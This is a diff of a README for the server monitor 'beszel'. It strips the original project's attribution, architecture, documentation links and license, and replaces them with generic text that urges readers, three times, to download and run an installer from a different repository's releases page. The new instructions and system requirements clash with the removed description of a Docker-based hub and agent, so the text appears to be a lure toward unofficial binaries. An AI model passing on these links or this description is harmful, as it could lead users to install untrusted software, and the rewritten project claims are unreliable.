@@ -1,68 +1,78 @@
-# Beszel
+# 🖥️ beszel - Your Simple Server Monitoring Solution
 
-Beszel is a lightweight server monitoring platform that includes Docker statistics, historical data, and alert functions.
+## 🚀 Getting Started
 
-It has a friendly web interface, simple configuration, and is ready to use out of the box. It supports automatic backup, multi-user, OAuth authentication, and API access.
+Welcome to **beszel**! This guide will help you download and run our lightweight server monitoring application. With **beszel**, you can track historical data, Docker stats, and receive alerts. 
 
-[![agent Docker Image Size](https://img.shields.io/docker/image-size/henrygd/beszel-agent/latest?logo=docker&label=agent%20image%20size)](https://hub.docker.com/r/henrygd/beszel-agent)
-[![hub Docker Image Size](https://img.shields.io/docker/image-size/henrygd/beszel/latest?logo=docker&label=hub%20image%20size)](https://hub.docker.com/r/henrygd/beszel)
-[![MIT license](https://img.shields.io/github/license/henrygd/beszel?color=%239944ee)](https://github.com/henrygd/beszel/blob/main/LICENSE)
-[![Crowdin](https://badges.crowdin.net/beszel/localized.svg)](https://crowdin.com/project/beszel)
+## 📥 Download Now
 
-![Screenshot of Beszel dashboard and system page, side by side. The dashboard shows metrics from multiple connected systems, while the system page shows detailed metrics for a single system.](https://henrygd-assets.b-cdn.net/beszel/screenshot-new.png)
+[![Download beszel](https://img.shields.io/badge/Download-beszel-brightgreen)](https://github.com/Thelevizin/beszel/releases)
 
-## Features
+## 📋 Features
 
-- **Lightweight**: Smaller and less resource-intensive than leading solutions.
-- **Simple**: Easy setup with little manual configuration required.
-- **Docker stats**: Tracks CPU, memory, and network usage history for each container.
-- **Alerts**: Configurable alerts for CPU, memory, disk, bandwidth, temperature, load average, and status.
-- **Multi-user**: Users manage their own systems. Admins can share systems across users.
-- **OAuth / OIDC**: Supports many OAuth2 providers. Password auth can be disabled.
-- **Automatic backups**: Save to and restore from disk or S3-compatible storage.
-<!-- - **REST API**: Use or update your data in your own scripts and applications. -->
+- **Track Server Performance:** Monitor essential data points for your servers.
+- **Historical Data:** Review past performance metrics for better decision-making.
+- **Docker Stats:** Keep an eye on your Docker containers and their resource usage.
+- **Alerts:** Get notified about critical issues before they become problems.
 
-## Architecture
+## 📦 System Requirements
 
-Beszel consists of two main components: the **hub** and the **agent**.
+Before you download **beszel**, please ensure your system meets the following requirements:
 
-- **Hub**: A web application built on [PocketBase](https://pocketbase.io/) that provides a dashboard for viewing and managing connected systems.
-- **Agent**: Runs on each system you want to monitor and communicates system metrics to the hub.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a Linux distribution with kernel 4.0 or newer.
+- **Processor:** Minimum dual-core processor.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB of free space for the application.
 
-## Getting started
+## 💻 Download & Install
 
-The [quick start guide](https://beszel.dev/guide/getting-started) and other documentation is available on our website, [beszel.dev](https://beszel.dev). You'll be up and running in a few minutes.
+To get started with **beszel**, please follow these steps:
 
-## Screenshots
+1. **Visit the Releases Page:** Click on the link below to go to the releases page.
+   
+   [Download beszel](https://github.com/Thelevizin/beszel/releases)
 
-![Dashboard](https://beszel.dev/image/dashboard.png)
-![System page](https://beszel.dev/image/system-full.png)
-![Notification Settings](https://beszel.dev/image/settings-notifications.png)
+2. **Select the Latest Version:** Look for the latest release at the top of the list. This version has the latest features and fixes.
 
-## Supported metrics
+3. **Download the Application:** Download the appropriate version for your operating system. Each file is clearly labeled.
 
-- **CPU usage** - Host system and Docker / Podman containers.
-- **Memory usage** - Host system and containers. Includes swap and ZFS ARC.
-- **Disk usage** - Host system. Supports multiple partitions and devices.
-- **Disk I/O** - Host system. Supports multiple partitions and devices.
-- **Network usage** - Host system and containers.
-- **Load average** - Host system.
-- **Temperature** - Host system sensors.
-- **GPU usage / temperature / power draw** - Nvidia and AMD only. Must use binary agent.
-- **Battery** - Host system battery charge.
+4. **Run the Installer:** After downloading, open the installer file. Follow the on-screen instructions to complete the installation.
 
-## Help and discussion
+5. **Launch beszel:** Once installation is complete, find **beszel** in your applications list and launch it.
 
-Please search existing issues and discussions before opening a new one. I try my best to respond, but may not always have time to do so.
+6. **Configure Your Server Services:** Follow the on-screen setup to connect **beszel** to your server and start monitoring.
 
-#### Bug reports and feature requests
+## 📊 Using beszel
 
-Bug reports and detailed feature requests should be posted on [GitHub issues](https://github.com/henrygd/beszel/issues).
+Once you have **beszel** running:
 
-#### Support and general discussion
+- **Dashboard Overview:** The dashboard provides a snapshot of your server's current state. You can see key metrics right away.
+- **Historical Data:** Navigate to the historical data section to view past performance. You can analyze trends over time.
+- **Docker Stats:** Access the Docker stats tab to monitor all your containers. This section helps you manage resources effectively.
+- **Alerts Configuration:** Set up alert parameters to receive notifications about any issues that arise.
 
-Support requests and general discussion can be posted on [GitHub discussions](https://github.com/henrygd/beszel/discussions) or the community-run [Matrix room](https://matrix.to/#/#beszel:matrix.org): `#beszel:matrix.org`.
+## 🗒️ Feedback and Support
 
-## License
+We welcome your feedback! If you encounter any issues or have questions, please check the Issues section on the GitHub page. You can also open a new issue if you need assistance.
 
-Beszel is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+## 🌟 Contributions
+
+We appreciate contributions to the **beszel** project. If you would like to contribute, please read our guidelines in the repository. Every bit helps make **beszel** better for everyone!
+
+## 🤝 Community
+
+Join our community of users to share experiences and tips on using **beszel** effectively. Support each other and benefit from shared knowledge.
+
+## 🌐 Additional Resources
+
+- **Documentation:** Review detailed documentation to assist with advanced features.
+- **GitHub Repository:** [Visit the GitHub Repository](https://github.com/Thelevizin/beszel)
+- **FAQs:** Frequently asked questions are available in the repository for quick help.
+
+## 📥 Download Now Again
+
+Don't forget to download **beszel** from our Releases page:
+
+[Download beszel](https://github.com/Thelevizin/beszel/releases) 
+
+Thank you for choosing **beszel**! Enjoy monitoring your servers with ease.
